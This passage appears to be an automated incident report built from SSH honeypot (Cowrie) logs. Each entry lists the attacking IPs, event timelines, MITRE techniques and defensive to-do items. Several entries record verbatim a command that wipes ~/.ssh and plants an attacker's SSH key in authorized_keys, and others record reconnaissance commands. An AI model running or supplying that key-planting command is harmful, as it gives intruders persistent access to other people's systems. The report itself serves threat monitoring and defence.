| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:45:44` | `cowrie.session.connect` |
| `2026-07-02 19:45:44` | `cowrie.client.version` |
| `2026-07-02 19:45:44` | `cowrie.client.kex` |
| `2026-07-02 19:45:45` | `cowrie.login.success` |
| `2026-07-02 19:45:46` | `cowrie.session.params` |
| `2026-07-02 19:45:46` | `cowrie.command.input` |
| `2026-07-02 19:45:46` | `cowrie.command.failed` |
| `2026-07-02 19:45:47` | `cowrie.log.closed` |
| `2026-07-02 19:45:48` | `cowrie.session.params` |
| `2026-07-02 19:45:48` | `cowrie.command.input` |
| `2026-07-02 19:45:48` | `cowrie.session.file_download` |
| `2026-07-02 19:45:48` | `cowrie.log.closed` |
| `2026-07-02 19:45:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.227.52[.]50` to AbuseIPDB if not already reported
- [ ] Block `163.227.52[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eec4ef185811

| Field | Detail |
|---|---|
| **Source IP** | `163.227.52[.]50` |
| **First Seen** | 2026-07-02 19:45 |
| **Last Seen** | 2026-07-02 19:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:45:48` | `cowrie.session.connect` |
| `2026-07-02 19:45:48` | `cowrie.client.version` |
| `2026-07-02 19:45:48` | `cowrie.client.kex` |
| `2026-07-02 19:45:50` | `cowrie.login.success` |
| `2026-07-02 19:45:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.227.52[.]50` to AbuseIPDB if not already reported
- [ ] Block `163.227.52[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd9d574de1f6

| Field | Detail |
|---|---|
| **Source IP** | `163.227.52[.]50` |
| **First Seen** | 2026-07-02 19:45 |
| **Last Seen** | 2026-07-02 19:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:45:50` | `cowrie.session.connect` |
| `2026-07-02 19:45:50` | `cowrie.client.version` |
| `2026-07-02 19:45:50` | `cowrie.client.kex` |
| `2026-07-02 19:45:52` | `cowrie.login.success` |
| `2026-07-02 19:45:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.227.52[.]50` to AbuseIPDB if not already reported
- [ ] Block `163.227.52[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc3c4b1289fd

| Field | Detail |
|---|---|
| **Source IP** | `139.99.74[.]35` |
| **First Seen** | 2026-07-02 19:46 |
| **Last Seen** | 2026-07-02 19:46 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a && echo "====" && cat /etc/os-release` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:46:10` | `cowrie.session.connect` |
| `2026-07-02 19:46:15` | `cowrie.client.version` |
| `2026-07-02 19:46:15` | `cowrie.client.kex` |
| `2026-07-02 19:46:38` | `cowrie.login.success` |
| `2026-07-02 19:46:49` | `cowrie.session.params` |
| `2026-07-02 19:46:49` | `cowrie.command.input` |
| `2026-07-02 19:46:54` | `cowrie.log.closed` |
| `2026-07-02 19:46:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.74[.]35` to AbuseIPDB if not already reported
- [ ] Block `139.99.74[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc49c3db95d6

| Field | Detail |
|---|---|
| **Source IP** | `212.112.19[.]163` |
| **First Seen** | 2026-07-02 19:47 |
| **Last Seen** | 2026-07-02 19:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:47:01` | `cowrie.session.connect` |
| `2026-07-02 19:47:01` | `cowrie.client.version` |
| `2026-07-02 19:47:01` | `cowrie.client.kex` |
| `2026-07-02 19:47:03` | `cowrie.login.success` |
| `2026-07-02 19:47:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.112.19[.]163` to AbuseIPDB if not already reported
- [ ] Block `212.112.19[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11df5adb1319

| Field | Detail |
|---|---|
| **Source IP** | `134.209.186[.]182` |
| **First Seen** | 2026-07-02 19:48 |
| **Last Seen** | 2026-07-02 19:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:48:10` | `cowrie.session.connect` |
| `2026-07-02 19:48:10` | `cowrie.client.version` |
| `2026-07-02 19:48:11` | `cowrie.client.kex` |
| `2026-07-02 19:48:11` | `cowrie.login.success` |
| `2026-07-02 19:48:12` | `cowrie.session.params` |
| `2026-07-02 19:48:12` | `cowrie.command.input` |
| `2026-07-02 19:48:12` | `cowrie.command.failed` |
| `2026-07-02 19:48:12` | `cowrie.log.closed` |
| `2026-07-02 19:48:12` | `cowrie.session.params` |
| `2026-07-02 19:48:12` | `cowrie.command.input` |
| `2026-07-02 19:48:13` | `cowrie.session.file_download` |
| `2026-07-02 19:48:13` | `cowrie.log.closed` |
| `2026-07-02 19:48:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.209.186[.]182` to AbuseIPDB if not already reported
- [ ] Block `134.209.186[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b0396d92236

| Field | Detail |
|---|---|
| **Source IP** | `134.209.186[.]182` |
| **First Seen** | 2026-07-02 19:48 |
| **Last Seen** | 2026-07-02 19:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:48:13` | `cowrie.session.connect` |
| `2026-07-02 19:48:13` | `cowrie.client.version` |
| `2026-07-02 19:48:13` | `cowrie.client.kex` |
| `2026-07-02 19:48:13` | `cowrie.login.success` |
| `2026-07-02 19:48:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.209.186[.]182` to AbuseIPDB if not already reported
- [ ] Block `134.209.186[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86e4c7fece80

| Field | Detail |
|---|---|
| **Source IP** | `134.209.186[.]182` |
| **First Seen** | 2026-07-02 19:48 |
| **Last Seen** | 2026-07-02 19:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:48:13` | `cowrie.session.connect` |
| `2026-07-02 19:48:13` | `cowrie.client.version` |
| `2026-07-02 19:48:13` | `cowrie.client.kex` |
| `2026-07-02 19:48:14` | `cowrie.login.success` |
| `2026-07-02 19:48:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.209.186[.]182` to AbuseIPDB if not already reported
- [ ] Block `134.209.186[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-283abf2c97f3

| Field | Detail |
|---|---|
| **Source IP** | `139.99.74[.]35` |
| **First Seen** | 2026-07-02 19:49 |
| **Last Seen** | 2026-07-02 19:50 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a && echo "====" && cat /etc/os-release` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:49:20` | `cowrie.session.connect` |
| `2026-07-02 19:49:25` | `cowrie.client.version` |
| `2026-07-02 19:49:25` | `cowrie.client.kex` |
| `2026-07-02 19:49:46` | `cowrie.login.success` |
| `2026-07-02 19:49:58` | `cowrie.session.params` |
| `2026-07-02 19:49:58` | `cowrie.command.input` |
| `2026-07-02 19:50:04` | `cowrie.log.closed` |
| `2026-07-02 19:50:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.74[.]35` to AbuseIPDB if not already reported
- [ ] Block `139.99.74[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d57f92167eb1

| Field | Detail |
|---|---|
| **Source IP** | `139.99.74[.]35` |
| **First Seen** | 2026-07-02 19:51 |
| **Last Seen** | 2026-07-02 19:52 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a && echo "====" && cat /etc/os-release` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:51:40` | `cowrie.session.connect` |
| `2026-07-02 19:51:45` | `cowrie.client.version` |
| `2026-07-02 19:51:45` | `cowrie.client.kex` |
| `2026-07-02 19:52:07` | `cowrie.login.success` |
| `2026-07-02 19:52:18` | `cowrie.session.params` |
| `2026-07-02 19:52:18` | `cowrie.command.input` |
| `2026-07-02 19:52:24` | `cowrie.log.closed` |
| `2026-07-02 19:52:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.74[.]35` to AbuseIPDB if not already reported
- [ ] Block `139.99.74[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a7a0b97b469

| Field | Detail |
|---|---|
| **Source IP** | `154.221.20[.]92` |
| **First Seen** | 2026-07-02 19:51 |
| **Last Seen** | 2026-07-02 19:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:51:41` | `cowrie.session.connect` |
| `2026-07-02 19:51:41` | `cowrie.client.version` |
| `2026-07-02 19:51:41` | `cowrie.client.kex` |
| `2026-07-02 19:51:42` | `cowrie.login.success` |
| `2026-07-02 19:51:43` | `cowrie.session.params` |
| `2026-07-02 19:51:43` | `cowrie.command.input` |
| `2026-07-02 19:51:43` | `cowrie.command.failed` |
| `2026-07-02 19:51:43` | `cowrie.log.closed` |
| `2026-07-02 19:51:44` | `cowrie.session.params` |
| `2026-07-02 19:51:44` | `cowrie.command.input` |
| `2026-07-02 19:51:44` | `cowrie.session.file_download` |
| `2026-07-02 19:51:44` | `cowrie.log.closed` |
| `2026-07-02 19:51:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.20[.]92` to AbuseIPDB if not already reported
- [ ] Block `154.221.20[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ca2fadfbdb4

| Field | Detail |
|---|---|
| **Source IP** | `154.221.20[.]92` |
| **First Seen** | 2026-07-02 19:51 |
| **Last Seen** | 2026-07-02 19:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:51:44` | `cowrie.session.connect` |
| `2026-07-02 19:51:44` | `cowrie.client.version` |
| `2026-07-02 19:51:45` | `cowrie.client.kex` |
| `2026-07-02 19:51:46` | `cowrie.login.success` |
| `2026-07-02 19:51:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.20[.]92` to AbuseIPDB if not already reported
- [ ] Block `154.221.20[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b62087badd9

| Field | Detail |
|---|---|
| **Source IP** | `154.221.20[.]92` |
| **First Seen** | 2026-07-02 19:51 |
| **Last Seen** | 2026-07-02 19:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:51:46` | `cowrie.session.connect` |
| `2026-07-02 19:51:46` | `cowrie.client.version` |
| `2026-07-02 19:51:46` | `cowrie.client.kex` |
| `2026-07-02 19:51:47` | `cowrie.login.success` |
| `2026-07-02 19:51:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.20[.]92` to AbuseIPDB if not already reported
- [ ] Block `154.221.20[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2c5011a3858

| Field | Detail |
|---|---|
| **Source IP** | `13.94.39[.]162` |
| **First Seen** | 2026-07-02 19:51 |
| **Last Seen** | 2026-07-02 19:54 |
| **Session Duration** | 163s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:51:54` | `cowrie.session.connect` |
| `2026-07-02 19:51:55` | `cowrie.client.version` |
| `2026-07-02 19:51:55` | `cowrie.client.kex` |
| `2026-07-02 19:52:18` | `cowrie.login.success` |
| `2026-07-02 19:52:38` | `cowrie.session.params` |
| `2026-07-02 19:52:38` | `cowrie.command.input` |
| `2026-07-02 19:52:38` | `cowrie.command.failed` |
| `2026-07-02 19:52:58` | `cowrie.log.closed` |
| `2026-07-02 19:53:15` | `cowrie.session.params` |
| `2026-07-02 19:53:15` | `cowrie.command.input` |
| `2026-07-02 19:53:17` | `cowrie.session.file_download` |
| `2026-07-02 19:53:17` | `cowrie.log.closed` |
| `2026-07-02 19:54:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.94.39[.]162` to AbuseIPDB if not already reported
- [ ] Block `13.94.39[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8052944ef249

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-07-02 19:52 |
| **Last Seen** | 2026-07-02 19:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:52:05` | `cowrie.session.connect` |
| `2026-07-02 19:52:05` | `cowrie.client.version` |
| `2026-07-02 19:52:05` | `cowrie.client.kex` |
| `2026-07-02 19:52:06` | `cowrie.login.success` |
| `2026-07-02 19:52:06` | `cowrie.session.params` |
| `2026-07-02 19:52:06` | `cowrie.command.input` |
| `2026-07-02 19:52:06` | `cowrie.command.failed` |
| `2026-07-02 19:52:06` | `cowrie.log.closed` |
| `2026-07-02 19:52:07` | `cowrie.session.params` |
| `2026-07-02 19:52:07` | `cowrie.command.input` |
| `2026-07-02 19:52:07` | `cowrie.session.file_download` |
| `2026-07-02 19:52:07` | `cowrie.log.closed` |
| `2026-07-02 19:52:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee83083d62f8

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-07-02 19:52 |
| **Last Seen** | 2026-07-02 19:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:52:07` | `cowrie.session.connect` |
| `2026-07-02 19:52:07` | `cowrie.client.version` |
| `2026-07-02 19:52:07` | `cowrie.client.kex` |
| `2026-07-02 19:52:07` | `cowrie.login.success` |
| `2026-07-02 19:52:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f07737e5764

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-07-02 19:52 |
| **Last Seen** | 2026-07-02 19:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:52:07` | `cowrie.session.connect` |
| `2026-07-02 19:52:07` | `cowrie.client.version` |
| `2026-07-02 19:52:08` | `cowrie.client.kex` |
| `2026-07-02 19:52:08` | `cowrie.login.success` |
| `2026-07-02 19:52:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa9ffbf80531

| Field | Detail |
|---|---|
| **Source IP** | `186.38.26[.]5` |
| **First Seen** | 2026-07-02 19:52 |
| **Last Seen** | 2026-07-02 19:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:52:48` | `cowrie.session.connect` |
| `2026-07-02 19:52:48` | `cowrie.client.version` |
| `2026-07-02 19:52:48` | `cowrie.client.kex` |
| `2026-07-02 19:52:48` | `cowrie.login.success` |
| `2026-07-02 19:52:49` | `cowrie.session.params` |
| `2026-07-02 19:52:49` | `cowrie.command.input` |
| `2026-07-02 19:52:49` | `cowrie.command.failed` |
| `2026-07-02 19:52:50` | `cowrie.log.closed` |
| `2026-07-02 19:52:50` | `cowrie.session.params` |
| `2026-07-02 19:52:50` | `cowrie.command.input` |
| `2026-07-02 19:52:51` | `cowrie.session.file_download` |
| `2026-07-02 19:52:51` | `cowrie.log.closed` |
| `2026-07-02 19:52:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.38.26[.]5` to AbuseIPDB if not already reported
- [ ] Block `186.38.26[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbdb86b1f7e3

| Field | Detail |
|---|---|
| **Source IP** | `186.38.26[.]5` |
| **First Seen** | 2026-07-02 19:52 |
| **Last Seen** | 2026-07-02 19:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:52:51` | `cowrie.session.connect` |
| `2026-07-02 19:52:51` | `cowrie.client.version` |
| `2026-07-02 19:52:51` | `cowrie.client.kex` |
| `2026-07-02 19:52:52` | `cowrie.login.success` |
| `2026-07-02 19:52:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.38.26[.]5` to AbuseIPDB if not already reported
- [ ] Block `186.38.26[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eed47e116fbc

| Field | Detail |
|---|---|
| **Source IP** | `186.38.26[.]5` |
| **First Seen** | 2026-07-02 19:52 |
| **Last Seen** | 2026-07-02 19:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:52:52` | `cowrie.session.connect` |
| `2026-07-02 19:52:52` | `cowrie.client.version` |
| `2026-07-02 19:52:52` | `cowrie.client.kex` |
| `2026-07-02 19:52:53` | `cowrie.login.success` |
| `2026-07-02 19:52:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.38.26[.]5` to AbuseIPDB if not already reported
- [ ] Block `186.38.26[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91271e4ada82

| Field | Detail |
|---|---|
| **Source IP** | `139.99.74[.]35` |
| **First Seen** | 2026-07-02 19:52 |
| **Last Seen** | 2026-07-02 19:53 |
| **Session Duration** | 50s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a && echo "====" && cat /etc/os-release` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:52:59` | `cowrie.session.connect` |
| `2026-07-02 19:53:05` | `cowrie.client.version` |
| `2026-07-02 19:53:05` | `cowrie.client.kex` |
| `2026-07-02 19:53:30` | `cowrie.login.success` |
| `2026-07-02 19:53:44` | `cowrie.session.params` |
| `2026-07-02 19:53:44` | `cowrie.command.input` |
| `2026-07-02 19:53:50` | `cowrie.log.closed` |
